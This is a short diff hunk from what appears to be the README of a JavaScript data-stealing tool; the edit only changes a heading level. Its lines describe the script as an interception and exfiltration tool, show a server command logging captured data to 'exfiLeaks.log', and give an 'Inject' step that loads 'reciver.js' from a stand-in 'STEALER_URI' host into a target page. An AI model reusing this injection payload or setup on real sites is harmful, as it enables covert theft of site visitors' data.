@@ -34,7 +34,7 @@ Overall, this script acts as a data interception and exfiltration tool, capturin
 
 ```sudo http-server --port 8080 -a 0.0.0.0 -d -i --cors > exfiLeaks.log```
 
-#### Inject: ```<script src="http://STEALER_URI:8080/reciver.js"></script>```
+##### Inject: ```<script src="http://STEALER_URI:8080/reciver.js"></script>```
 
 ### JSREVICER ONELINERS:
 
